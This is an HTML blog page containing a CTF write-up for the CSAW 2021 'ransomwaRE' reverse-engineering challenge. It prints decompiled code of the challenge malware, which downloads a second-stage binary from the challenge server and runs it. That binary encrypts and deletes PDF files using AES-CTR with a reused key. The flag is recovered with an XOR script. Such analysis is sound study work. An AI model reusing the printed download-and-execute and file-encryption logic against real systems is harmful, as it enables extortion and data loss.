@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>My Blog - 2021-09-CSAW - ransomwaRE</title>
+
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="Abraxus">
+    <!-- FontAwesome JS-->
+    <script defer src="../../assets/js/fontawesome.min.js"></script>
+
+    <!-- Theme CSS -->
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body class="theme-bg-light">
+
+    <header class="header text-center">
+    <h1 class="blog-name pt-lg-4 mb-0"><a class="no-text-decoration" href="index.html">Abraxus's Blog</a></h1>
+
+    <nav class="navbar navbar-expand-lg navbar-dark">
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div id="navigation" class="collapse navbar-collapse flex-column">
+            <div class="profile-section pt-3 pt-lg-0">
+                <img class="profile-image mb-3 rounded-circle mx-auto" src="../../assets/images/profile.png" alt="image">
+
+                <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
+                <ul class="social-list list-inline py-3 mx-auto">
+                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
+                </ul><!--//social-list-->
+                <hr>
+            </div><!--//profile-section-->
+
+            <ul class="navbar-nav flex-column text-center">
+                <li class="nav-item">
+                    <a class="nav-link" href="../../index.html"><i class="fas fa-home fa-fw me-2"></i>Blog Home <i class="fas fa-home fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../about.html"><i class="fas fa-user fa-fw me-2"></i>About Me <i class="fas fa-user fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../blog-posts.html"><i class="fas fa-bookmark fa-fw me-2"></i>Blog Posts <i class="fas fa-bookmark fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../writeups.html"><i class="fas fa-flag fa-fw me-2"></i>Writeups <i class="fas fa-flag fa-fw me-2"></i></a>
+                </li>
+            </ul>
+
+            <div class="my-2 my-md-3 text-center">
+                <a class="btn btn-primary" href="https://github.com/Kasimir123" target="_blank">Get in Touch</a>
+            </div>
+        </div>
+    </nav>
+</header>
+
+    <div class="main-wrapper">
+
+        <article class="markdown-section my-5 mx-5">
+            <h1 id="csaw-ransomware-write-up">CSAW ransomwaRE Write Up</h1>
+<h2 id="details">Details:</h2>
+<p>Jeopardy style CTF</p>
+<p>Category: Reverse Engineering</p>
+<p>Comments:</p>
+<p>Help! Your local convenience store is being held for ransom. Apparently this past July 11th a bunch of their documents got encrypted by the &quot;Noes&quot; gang. The business has backups for some of them, but not their flag file. This was the last straw for the manager, who tapped his slush fund and came to you for help rather than pay the ransom. Here are the files they had left in their directory along with the malware and the ransom notice. Can you REcover the flag?</p>
+<h2 id="write-up">Write up:</h2>
+<p>The first thing I did was set up a VM for this challenge since it was malware. I then decompiled the main function:</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+<span style="color:Blue;">int</span> __cdecl main(<span style="color:Blue;">int</span> argc, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **argv, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **envp)
+{
+
+  GetSystemTime(&amp;SystemTime);
+  *(_DWORD *)pbData = SystemTime.wDayOfWeek;
+  v3 = 16i64;
+  v13 = SystemTime.wMonth;
+  v14 = SystemTime.wYear;
+  v15 = SystemTime.wDay;
+  pdwDataLen = 16;
+  phProv = 0i64;
+  phHash = 0i64;
+  <span style="color:Blue;">if</span> ( !CryptAcquireContextW(&amp;phProv, 0i64, 0i64, 1u, 0xF0000000) )
+    <span style="color:Blue;">goto</span> LABEL_14;
+  <span style="color:Blue;">if</span> ( !CryptCreateHash(phProv, 0x8003u, 0i64, 0, &amp;phHash) )
+  {
+    CryptReleaseContext(phProv, 0);
+    exit(1);
+  }
+  <span style="color:Blue;">if</span> ( !CryptHashData(phHash, pbData, 16u, 0) )
+  {
+    CryptDestroyHash(phHash);
+    CryptReleaseContext(phProv, 0);
+    exit(1);
+  }
+  <span style="color:Blue;">if</span> ( !CryptGetHashParam(phHash, 2u, v16, &amp;pdwDataLen, 0) )
+LABEL_14:
+    exit(1);
+  v4 = MultiByteStr;
+  MultiByteStr[32] = 0;
+  v5 = v16;
+  <span style="color:Blue;">do</span>
+  {
+    format_print_hex(v4, <span style="color:#A31515;">&quot;%02x&quot;</span>, *v5);
+    v4 += 2;
+    ++v5;
+    --v3;
+  }
+  <span style="color:Blue;">while</span> ( v3 );
+  v6 = (WCHAR *)sub_7FF6A36762E0(0x42ui64);
+  MultiByteToWideChar(0, 0, MultiByteStr, -1, v6, 33);
+  <span style="color:Blue;">if</span> ( phHash )
+    CryptDestroyHash(phHash);
+  <span style="color:Blue;">if</span> ( phProv )
+    CryptReleaseContext(phProv, 0);
+  http_and_cry(v6);
+  <span style="color:Blue;">return</span> 0;
+}
+</pre></div>
+</div>
+<p>I saw that the program used the systems day, month, and year to hash some value and then passed the hashed value to what I renamed to http_and_cry. From the description I also knew the date I would most likely have to set my system to was July 11th, 2021.</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+__int64 __fastcall http_and_cry(LPCWSTR pwszObjectName)
+{
+
+  v24 = -2i64;
+  http_obj = WinHttpOpen(
+               L<span style="color:#A31515;">&quot;Mozilla / 5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko / 20100101 Firefox / 89.0&quot;</span>,
+               1u,
+               0i64,
+               0i64,
+               0);
+  http_obj_cpy = http_obj;
+  <span style="color:Blue;">if</span> ( !http_obj )
+    exit(1);
+  http_conn = WinHttpConnect(http_obj, L<span style="color:#A31515;">&quot;rev.chal.csaw.io&quot;</span>, 8129u, 0);
+  <span style="color:Blue;">if</span> ( !http_conn )
+    exit(1);
+  v5 = (<span style="color:Blue;">char</span> *)sub_7FF6A36762E0(68ui64);
+  *(_WORD *)v5 = 47;
+  *(_OWORD *)(v5 + 2) = *(_OWORD *)pwszObjectName;
+  *(_OWORD *)(v5 + 18) = *((_OWORD *)pwszObjectName + 1);
+  *(_OWORD *)(v5 + 34) = *((_OWORD *)pwszObjectName + 2);
+  *(_OWORD *)(v5 + 50) = *((_OWORD *)pwszObjectName + 3);
+  *((_WORD *)v5 + 33) = pwszObjectName[32];
+  get_request = WinHttpOpenRequest(http_conn, L<span style="color:#A31515;">&quot;GET&quot;</span>, pwszObjectName, 0i64, 0i64, 0i64, 0);
+  hInternet = get_request;
+  <span style="color:Blue;">if</span> ( !get_request )
+    exit(1);
+  <span style="color:Blue;">if</span> ( !WinHttpSendRequest(get_request, 0i64, 0, 0i64, 0, 0, 0i64) )
+    exit(1);
+  <span style="color:Blue;">if</span> ( !WinHttpReceiveResponse(hInternet, 0i64) )
+    exit(1);
+  response = 0;
+  dwBufferLength = 4;
+  WinHttpQueryHeaders(hInternet, 0x20000013u, 0i64, &amp;response, &amp;dwBufferLength, 0i64);
+  <span style="color:Blue;">if</span> ( response != 200 )                        <span style="color:Green;">// look for 200 response</span>
+    exit(1);
+  memset(v27, 0, 264ui64);
+  v27[0] = (__int64)&amp;unk_7FF6A367B600;
+  std::ios::ios(&amp;v27[21]);
+  std::ostream::ostream(v27, &amp;v27[1], 0i64, 0i64);
+  *(__int64 *)((<span style="color:Blue;">char</span> *)v27 + *(<span style="color:Blue;">int</span> *)(v27[0] + 4)) = (__int64)&amp;std::ofstream::`vftable&#39;;
+  *(DWORD *)((<span style="color:Blue;">char</span> *)&amp;ProcessInformation.dwThreadId + *(<span style="color:Blue;">int</span> *)(v27[0] + 4)) = *(_DWORD *)(v27[0] + 4) - 168;
+  v22 = &amp;v27[1];
+  std::streambuf::streambuf(&amp;v27[1]);
+  v27[1] = (__int64)&amp;std::filebuf::`vftable&#39;;
+  BYTE4(v27[16]) = 0;
+  BYTE1(v27[15]) = 0;
+  std::streambuf::_Init(&amp;v27[1]);
+  v27[17] = 0i64;
+  *(__int64 *)((<span style="color:Blue;">char</span> *)&amp;v27[15] + 4) = qword_7FF6A36808C8;
+  v27[14] = 0i64;
+  sys_proc_path = (<span style="color:Blue;">wchar_t</span> *)malloc(0x208ui64);
+  v9 = wgetenv(L<span style="color:#A31515;">&quot;USERPROFILE&quot;</span>);
+  wcsncpy(sys_proc_path, v9, 227ui64);          <span style="color:Green;">// append the user profile</span>
+  wcsncat(sys_proc_path, L<span style="color:#A31515;">&quot;\\AppData\\Local\\Temp\\sys_proc.txt&quot;</span>, 33ui64);<span style="color:Green;">// append path to local app data</span>
+  <span style="color:Blue;">if</span> ( v27[17] || (v10 = std::_Fiopen(sys_proc_path, 2, 64)) == 0i64 )
+  {
+    std::ios::setstate((<span style="color:Blue;">char</span> *)v27 + *(<span style="color:Blue;">int</span> *)(v27[0] + 4), 2i64);
+  }
+  <span style="color:Blue;">else</span>
+  {
+    sub_7FF6A3674230(&amp;v27[1], v10, 1i64);
+    v11 = std::streambuf::getloc(&amp;v27[1], &amp;v22);
+    v12 = (std::codecvt_base *)sub_7FF6A3675120(v11);
+    <span style="color:Blue;">if</span> ( std::codecvt_base::always_noconv(v12) )
+    {
+      v27[14] = 0i64;
+    }
+    <span style="color:Blue;">else</span>
+    {
+      v27[14] = (__int64)v12;
+      std::streambuf::_Init(&amp;v27[1]);
+    }
+    <span style="color:Blue;">if</span> ( v23 )
+    {
+      v13 = (<span style="color:Blue;">void</span> (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v23 + 16i64))(v23);
+      <span style="color:Blue;">if</span> ( v13 )
+        (**v13)(v13, 1i64);
+    }
+    std::ios::clear((<span style="color:Blue;">char</span> *)v27 + *(<span style="color:Blue;">int</span> *)(v27[0] + 4), 0i64, 0i64);
+  }
+  <span style="color:Blue;">if</span> ( (*((_BYTE *)&amp;v27[2] + *(<span style="color:Blue;">int</span> *)(v27[0] + 4)) &amp; 6) != 0 )
+  {
+    free(sys_proc_path);
+    exit(1);
+  }
+  <span style="color:Blue;">do</span>
+  {
+    dwNumberOfBytesAvailable[0] = 0;
+    <span style="color:Blue;">if</span> ( !WinHttpQueryDataAvailable(hInternet, dwNumberOfBytesAvailable) )
+    {
+      free(sys_proc_path);
+      exit(1);
+    }
+    v14 = sub_7FF6A36762E0(dwNumberOfBytesAvailable[0] + 1);
+    v15 = v14;
+    <span style="color:Blue;">if</span> ( !v14 )
+    {
+      dwNumberOfBytesAvailable[0] = 0;
+      free(sys_proc_path);
+      exit(1);
+    }
+    memset(v14, 0, dwNumberOfBytesAvailable[0] + 1);
+    <span style="color:Blue;">if</span> ( !WinHttpReadData(hInternet, v15, dwNumberOfBytesAvailable[0], &amp;dwNumberOfBytesRead) )
+    {
+      free(sys_proc_path);
+      exit(1);
+    }
+    std::ostream::write(v27, v15, dwNumberOfBytesAvailable[0]);
+    <span style="color:Blue;">operator</span> <span style="color:Blue;">delete</span>[](v15);
+  }
+  <span style="color:Blue;">while</span> ( dwNumberOfBytesAvailable[0] );
+  <span style="color:Blue;">if</span> ( !sub_7FF6A36742F0(&amp;v27[1]) )
+    std::ios::setstate((<span style="color:Blue;">char</span> *)v27 + *(<span style="color:Blue;">int</span> *)(v27[0] + 4), 2i64);
+  WinHttpCloseHandle(hInternet);
+  WinHttpCloseHandle(http_conn);
+  WinHttpCloseHandle(http_obj_cpy);
+  <span style="color:Blue;">if</span> ( (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)create_sys_proc(sys_proc_path) )
+  {
+    free(sys_proc_path);
+    exit(1);
+  }
+  memset(&amp;StartupInfo.cb + 1, 0, 0x64ui64);
+  StartupInfo.cb = 104;
+  ProcessInformation.hProcess = 0i64;
+  ProcessInformation.hThread = 0i64;
+  *(_QWORD *)&amp;ProcessInformation.dwProcessId = 0i64;
+  <span style="color:Blue;">if</span> ( !CreateProcessW(sys_proc_path, 0i64, 0i64, 0i64, 0, 0, 0i64, 0i64, &amp;StartupInfo, &amp;ProcessInformation) ) <span style="color:Green;">// do NOT let this get hit</span>
+  {
+    free(sys_proc_path);
+    exit(1);
+  }
+  WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
+  sys_procid_path = (<span style="color:Blue;">wchar_t</span> *)malloc(520ui64); <span style="color:Green;">// malloc space for the path</span>
+  user_profile = wgetenv(L<span style="color:#A31515;">&quot;USERPROFILE&quot;</span>);
+  wcsncpy_s(sys_procid_path, 0x104ui64, user_profile, 0xE1ui64);<span style="color:Green;">// copy user profile to path</span>
+  wcsncat_s(sys_procid_path, 0x104ui64, L<span style="color:#A31515;">&quot;\\AppData\\Local\\Temp\\sys_procid.txt&quot;</span>, 0x23ui64);<span style="color:Green;">// cat path to the sys_procid.txt file</span>
+  userIdFile = wfopen(sys_procid_path, L<span style="color:#A31515;">&quot;rb&quot;</span>);  <span style="color:Green;">// open sys_procid.txt to read for the user id</span>
+  userIdFile2 = userIdFile;
+  <span style="color:Blue;">if</span> ( userIdFile &amp;&amp; (fread(userId, 2ui64, 17ui64, userIdFile), !ferror(userIdFile2)) )<span style="color:Green;">// if we read it, delete the file</span>
+                                                <span style="color:Green;">// </span>
+                                                <span style="color:Green;">// read 17 2 byte characters</span>
+  {
+    fclose(userIdFile2);
+    <span style="color:Blue;">if</span> ( !DeleteFileW(sys_procid_path) )
+    {
+      free(sys_procid_path);
+      exit(1);
+    }
+    free(sys_procid_path);
+  }
+  <span style="color:Blue;">else</span>                                          <span style="color:Green;">// else just free the fd</span>
+  {
+    free(sys_procid_path);
+    <span style="color:Blue;">if</span> ( *errno() )
+    {
+      free(sys_proc_path);
+      exit(1);
+    }
+  }
+  <span style="color:Blue;">if</span> ( !DeleteFileW(sys_proc_path) )            <span style="color:Green;">// try deleting the other file</span>
+  {
+    free(sys_proc_path);
+    exit(1);
+  }
+  v20 = sub_7FF6A3674D00(std::cout);            <span style="color:Green;">// print out the emoji ascii art</span>
+  sub_7FF6A3674F00(v20);
+  wideprint((<span style="color:Blue;">wchar_t</span> *)&amp;Format);
+  wideprint((<span style="color:Blue;">wchar_t</span> *)L<span style="color:#A31515;">&quot;                                       O H   N O E S ! ! ! ! \n\n&quot;</span>);
+  wideprint((<span style="color:Blue;">wchar_t</span> *)&amp;Format);
+  wideprint((<span style="color:Blue;">wchar_t</span> *)L<span style="color:#A31515;">&quot;WE HAVE ENCRYPTED YOUR SECRET CSAW FILES WITH CSAWLOCKER.\n&quot;</span>);
+  wideprint((<span style="color:Blue;">wchar_t</span> *)L<span style="color:#A31515;">&quot;WE ACCEPT PAYMENT IN FLAGS, MONTHLY INSTALLMENTS ARE ACCEPTABLE.\n&quot;</span>);
+  wideprint((<span style="color:Blue;">wchar_t</span> *)L<span style="color:#A31515;">&quot;YOUR USER ID IS %s WHEN YOU CONTACT OUR CUSTOMER SERVICE DEPARTMENT.\n&quot;</span>, userId);
+  wideprint((<span style="color:Blue;">wchar_t</span> *)L<span style="color:#A31515;">&quot;DON&#39;T TRY TO GET YOUR DATA BACK BEFORE THE END OF THE CTF, OUR RANSOMWARE IS FOOLPROOF.\n&quot;</span>);
+  wideprint((<span style="color:Blue;">wchar_t</span> *)L<span style="color:#A31515;">&quot;\n&quot;</span>);
+  wideprint((<span style="color:Blue;">wchar_t</span> *)L<span style="color:#A31515;">&quot;P.S. MUAHAHAHAHAHA.\n&quot;</span>);
+  free(sys_proc_path);
+  <span style="color:Blue;">return</span> sub_7FF6A3672530(v27);
+}
+</pre></div>
+</div>
+<p>Looking at this function I saw that we connect to a webserver and using the hashed value we download a file from rev.chal.csaw.io:8129/[hashed value]. The program then does some crypto stuff on that file and saves it. I decided to just set the system time on the vm to the date and let the program run up until the point where it saves the file but before it creates a new process with said file.</p>
+<p>I then decompiled the downloaded file:</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+<span style="color:Blue;">int</span> __cdecl main(<span style="color:Blue;">int</span> argc, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **argv, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **envp)
+{
+
+  _main(argc, argv, envp);
+  key_iv = generateKeyIV();                     <span style="color:Green;">// generate the key_iv</span>
+  directoryPath = (<span style="color:Blue;">wchar_t</span> *)malloc(520ui64);   <span style="color:Green;">// malloc the directory path</span>
+  USERPROFILE = _wgetenv(L<span style="color:#A31515;">&quot;USERPROFILE&quot;</span>);
+  wcsncpy_s(directoryPath, 0x104ui64, USERPROFILE, 0xE8ui64);
+  wcsncat(directoryPath, L&quot;\\SecretCSAWDocuments\\&quot;, 0x16ui64);
+  directoryDupe = (<span style="color:Blue;">wchar_t</span> *)malloc(520ui64);   <span style="color:Green;">// malloc space for directory dupe</span>
+  wcsncpy_s(directoryDupe, 0x104ui64, directoryPath, 0x104ui64);
+  basePath = (<span style="color:Blue;">wchar_t</span> *)malloc(520ui64);        <span style="color:Green;">// malloc base path space</span>
+  wcsncpy_s(basePath, 0x104ui64, directoryPath, 0x104ui64);
+  fileToEncryptPath = (<span style="color:Blue;">wchar_t</span> *)malloc(520ui64);<span style="color:Green;">// malloc space for files to encrypt</span>
+  <span style="color:Blue;">if</span> ( PathFileExistsW(directoryPath) )
+  {
+    writeUserID(key_iv);                        <span style="color:Green;">// writes key iv to proc id: ab53f132c859a706</span>
+    sendKey(key_iv);                            <span style="color:Green;">// sends key to their server?</span>
+    wcsncat(directoryPath, L<span style="color:#A31515;">&quot;*.pdf&quot;</span>, 6ui64);
+    hFind = FindFirstFileW(directoryPath, &amp;firstFile);<span style="color:Green;">// find the first .pdf file</span>
+    <span style="color:Blue;">if</span> ( hFind != (HANDLE)-1i64 )               <span style="color:Green;">// if file exists</span>
+    {
+      <span style="color:Blue;">do</span>
+      {
+        wcsncpy_s(fileToEncryptPath, 260ui64, directoryDupe, 260ui64);<span style="color:Green;">// copies directory dupe to fileToEncryptPath</span>
+        length_of_file_name = wcslen(firstFile.cFileName);<span style="color:Green;">// gets the length of the filename</span>
+        wcsncat(fileToEncryptPath, firstFile.cFileName, length_of_file_name);<span style="color:Green;">// cat the file name to where we want to encrypt it</span>
+        encryptionErrorCode = encryptAndWrite(basePath, fileToEncryptPath, key_iv);
+        <span style="color:Blue;">if</span> ( encryptionErrorCode )              <span style="color:Green;">// if it fails, free everything and exit</span>
+        {
+          free(key_iv-&gt;customer_id);
+          free(key_iv-&gt;iv);
+          free(key_iv-&gt;key);
+          free(key_iv);
+          free(directoryPath);
+          free(basePath);
+          free(directoryDupe);
+          free(fileToEncryptPath);
+          exit(encryptionErrorCode);
+        }
+        memset(fileToEncryptPath, 0, 0x104ui64);
+      }
+      <span style="color:Blue;">while</span> ( FindNextFileW(hFind, &amp;firstFile) );<span style="color:Green;">// loop through all files</span>
+      FindClose(hFind);
+    }
+  }
+  free(key_iv-&gt;customer_id);
+  free(key_iv-&gt;iv);
+  free(key_iv-&gt;key);
+  free(key_iv);
+  free(directoryPath);
+  free(basePath);
+  free(directoryDupe);
+  free(fileToEncryptPath);
+  <span style="color:Blue;">return</span> 0;
+}
+</pre></div>
+</div>
+<p>From the main function I noticed a few things. The most important were the generateKeyIV function and the encryptAndWrite function.</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+Struct *__cdecl generateKeyIV()
+{
+
+  mats = (Struct *)malloc(0x20ui64);
+  <span style="color:Blue;">if</span> ( !mats )
+    exit(1);
+  mats-&gt;key = (<span style="color:Blue;">unsigned</span> __int8 *)malloc(0x10ui64);
+  mats-&gt;iv = (<span style="color:Blue;">unsigned</span> __int8 *)malloc(0x10ui64);
+  mats-&gt;customer_id = (<span style="color:Blue;">unsigned</span> __int8 *)malloc(8ui64);
+  <span style="color:Blue;">if</span> ( !(<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)RAND_bytes(mats-&gt;key, 16i64)
+    || !(<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)RAND_bytes(mats-&gt;iv, 16i64)
+    || !(<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)RAND_bytes(mats-&gt;customer_id, 8i64) )
+  {
+    free(mats-&gt;key);
+    free(mats-&gt;iv);
+    free(mats-&gt;customer_id);
+    free(mats);
+    exit(1);
+  }
+  mats-&gt;cipher_type = (<span style="color:Blue;">const</span> EVP_CIPHER *)EVP_aes_128_ctr();
+  <span style="color:Blue;">return</span> mats;
+}
+</pre></div>
+</div>
+<p>The generateKeyIV function was important because it told me what type of cipher the ransomware used: aes ctr.</p>
+<p>It also told me the key and the iv were generated once and then used for all files which meant that I would most likely be able to abuse the cipher type.</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+<span style="color:Blue;">int</span> __cdecl encryptAndWrite(<span style="color:Blue;">wchar_t</span> *basePath, WCHAR *fileToEncryptPath, Struct *keyIv)
+{
+
+  *(_QWORD *)hashDigits = &#39;3\02\01\00&#39;;
+  *(_QWORD *)&amp;hashDigits[4] = &#39;7\06\05\04&#39;;
+  *(_QWORD *)&amp;hashDigits[8] = &#39;b\0a\09\08&#39;;
+  *(_QWORD *)&amp;hashDigits[12] = &#39;f\0e\0d\0c&#39;;
+  hashDigits[16] = 0;
+  dwStatus = 0;
+  *(_QWORD *)outfileSuffix = &#39;f\0d\0p\0.&#39;;      <span style="color:Green;">// .pdf.cryptastic</span>
+  *(_QWORD *)&amp;outfileSuffix[4] = &#39;y\0r\0c\0.&#39;;
+  *(_QWORD *)&amp;outfileSuffix[8] = &#39;s\0a\0t\0p&#39;;
+  *(_QWORD *)&amp;outfileSuffix[12] = &#39;c\0i\0t&#39;;
+  fSuccess = 1;
+  dwStatus = get_sha256_sum(sha256Hash, fileToEncryptPath);<span style="color:Green;">// gets the sha256 sum of the file</span>
+  <span style="color:Blue;">if</span> ( dwStatus )
+    <span style="color:Blue;">return</span> -1;
+  basePathLen = wcslen(basePath);               <span style="color:Green;">// gets the length of the base path</span>
+  outfileNameLength = basePathLen + wcslen(outfileSuffix) + 65;<span style="color:Green;">// gets length of file plus crypt</span>
+  <span style="color:Blue;">if</span> ( outfileNameLength &gt; 0x104 )              <span style="color:Green;">// checks if file is an ok length</span>
+    <span style="color:Blue;">return</span> -1;
+  outfileName = (<span style="color:Blue;">wchar_t</span> *)malloc(2 * outfileNameLength);<span style="color:Green;">// malloc double the space</span>
+  basePathLen2 = wcslen(basePath);
+  wcsncpy_s(outfileName, outfileNameLength, basePath, basePathLen2);<span style="color:Green;">// copy the new filename</span>
+  i = 0;
+  <span style="color:Blue;">for</span> ( i_0 = 0; i_0 &lt;= 31; ++i_0 )             <span style="color:Green;">// make the filename encrypted</span>
+  {
+    wcsncat(outfileName, &amp;hashDigits[sha256Hash[i_0] &gt;&gt; 4], 1ui64);
+    wcsncat(outfileName, &amp;hashDigits[sha256Hash[i_0] &amp; 0xF], 1ui64);
+  }
+  outfileSuffixLen = wcslen(outfileSuffix);
+  wcsncat_s(outfileName, outfileNameLength, outfileSuffix, outfileSuffixLen + 1);<span style="color:Green;">// copy the suffix to the file</span>
+  outfile = 0i64;
+  infile = _wfopen(fileToEncryptPath, aR);      <span style="color:Green;">// open original in read mode</span>
+  <span style="color:Blue;">if</span> ( infile )
+  {
+    outfile = _wfopen(outfileName, L<span style="color:#A31515;">&quot;wb&quot;</span>);      <span style="color:Green;">// open out in write mode</span>
+    <span style="color:Blue;">if</span> ( outfile )                              <span style="color:Green;">// if we were able to open the file</span>
+    {
+      cipher_block_size = EVP_CIPHER_block_size(keyIv-&gt;cipher_type);<span style="color:Green;">// EVP_aes_128_ctr</span>
+      v17 = cipher_block_size + 1024 - 1i64;
+      v7 = alloca(16 * ((<span style="color:Blue;">unsigned</span> __int64)(cipher_block_size + 1024 + 15i64) &gt;&gt; 4));
+      p_out_buf = (<span style="color:Blue;">unsigned</span> __int8 (*)[])&amp;v8;
+      ctx = (EVP_CIPHER_CTX *)EVP_CIPHER_CTX_new();
+      <span style="color:Blue;">if</span> ( ctx &amp;&amp; (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)EVP_CipherInit_ex(ctx, keyIv-&gt;cipher_type, 0i64, 0i64, 0i64, 1) )
+      {
+        <span style="color:Blue;">if</span> ( (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)EVP_CIPHER_CTX_key_length(ctx) != 16 )
+          OPENSSL_die(
+            <span style="color:#A31515;">&quot;assertion failed: EVP_CIPHER_CTX_key_length(ctx) == AES_KEY_SIZE&quot;</span>,
+            <span style="color:#A31515;">&quot;C:\\Users\\IEUser\\Documents\\CSAW-9-2021\\CSAW-CTF-2021-Quals\\rev\\ransomware\\encryptor.c&quot;</span>,
+            284i64);
+        <span style="color:Blue;">if</span> ( (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)EVP_CIPHER_CTX_iv_length(ctx) != 16 )
+          OPENSSL_die(
+            <span style="color:#A31515;">&quot;assertion failed: EVP_CIPHER_CTX_iv_length(ctx) == AES_KEY_SIZE&quot;</span>,
+            <span style="color:#A31515;">&quot;C:\\Users\\IEUser\\Documents\\CSAW-9-2021\\CSAW-CTF-2021-Quals\\rev\\ransomware\\encryptor.c&quot;</span>,
+            285i64);
+        <span style="color:Blue;">if</span> ( (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)EVP_CipherInit_ex(ctx, 0i64, 0i64, keyIv-&gt;key, keyIv-&gt;iv, 1) )
+        {
+          <span style="color:Blue;">while</span> ( 1 )
+          {
+            num_bytes_read = fread(in_buf, 1ui64, 0x400ui64, infile);
+            <span style="color:Blue;">if</span> ( ferror(infile) )
+              <span style="color:Blue;">break</span>;
+            <span style="color:Blue;">if</span> ( !(<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)EVP_CipherUpdate(ctx, p_out_buf, &amp;out_len, in_buf, num_bytes_read) )
+              <span style="color:Blue;">break</span>;
+            fwrite(p_out_buf, 1ui64, out_len, (FILE *)outfile);
+            <span style="color:Blue;">if</span> ( ferror((FILE *)outfile) )
+              <span style="color:Blue;">break</span>;
+            <span style="color:Blue;">if</span> ( num_bytes_read &lt;= 1023 )
+            {
+              <span style="color:Blue;">if</span> ( (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)EVP_CipherFinal_ex(ctx, p_out_buf, &amp;out_len) )
+              {
+                fwrite(p_out_buf, 1ui64, out_len, (FILE *)outfile);
+                <span style="color:Blue;">if</span> ( !ferror((FILE *)outfile) )
+                {
+                  EVP_CIPHER_CTX_reset(ctx);
+                  fclose(infile);
+                  fclose((FILE *)outfile);
+                  fSuccess = DeleteFileW(fileToEncryptPath);
+                  <span style="color:Blue;">if</span> ( fSuccess )
+                  {
+                    free(outfileName);
+                    result = 0;
+                  }
+                  <span style="color:Blue;">else</span>
+                  {
+                    free(outfileName);
+                    result = GetLastError();
+                  }
+                  <span style="color:Blue;">return</span> result;
+                }
+              }
+              <span style="color:Blue;">break</span>;
+            }
+          }
+        }
+        EVP_CIPHER_CTX_reset(ctx);
+        free(outfileName);
+        fclose(infile);
+        fclose((FILE *)outfile);
+        result = *_errno();
+      }
+      <span style="color:Blue;">else</span>
+      {
+        free(outfileName);
+        fclose(infile);
+        fclose((FILE *)outfile);
+        result = *_errno();
+      }
+    }
+    <span style="color:Blue;">else</span>
+    {
+      free(outfileName);
+      fclose(infile);
+      result = *_errno();
+    }
+  }
+  <span style="color:Blue;">else</span>
+  {
+    free(outfileName);
+    result = *_errno();
+  }
+  <span style="color:Blue;">return</span> result;
+}
+</pre></div>
+</div>
+<p>The encryptAndWrite function was important because it showed me how the files were encrypted and let me see which file was encrypted to which encrypted file:</p>
+<pre><code>2020 IC3 is cad0b75505847a4792a67bb33ece21ec9c7bd21395ca6b158095d92772e01637
+20180212_ is 9df65cc45479c058ef4a600c1e607fec44d83682db732f077817c58bed47a191
+us-aers- is a25981adfb782d04cccfb2ad66ae8e63ead31f62fb898913f1ec99359f2e1c4b
+</code></pre>
+<p>From here I checked if xor'ing one file with it's encrypted counterpart gave us the same values (could be done because of cipher type and all of the files using the same key and iv). This ended up being the case so I wrote a script that would take the xor'ed values and xor the encrypted flag file to get the flag:</p>
+<div class="lang-py editor-colors">f = open('2020_IC3Report.pdf.backup', "rb").read()
+f2 = open('cad0b75505847a4792a67bb33ece21ec9c7bd21395ca6b158095d92772e01637.pdf.cryptastic', "rb").read()
+
+f3 = open('ea6b505ffded681a256232ed214d4c3b410c8b4f052775eb7e67dcbd5af64e63.pdf.cryptastic', "rb").read()
+
+f4 = open('flag.pdf', "wb")
+
+x= []
+
+for i in range(len(f3)):
+	x.append((f3[i] ^ (f[i] ^ f2[i])))
+
+f4.write(bytes(x))
+</div>
+<p>This then generated a pdf file which said the flag was:</p>
+<pre><code>flag{w4y_t0_put_th3_RE_1n_W1nd0w5_r4n50mw4RE}
+</code></pre>
+
+        </article>
+
+        <footer class="footer text-left py-2 theme-bg-dark">
+
+    <small class="copyright">&nbsp;Generated by <a href="https://github.com/Kasimir123/Blog-Generator" target="_blank">Blog Generator</a> from Kasimir123</small>
+
+</footer>
+
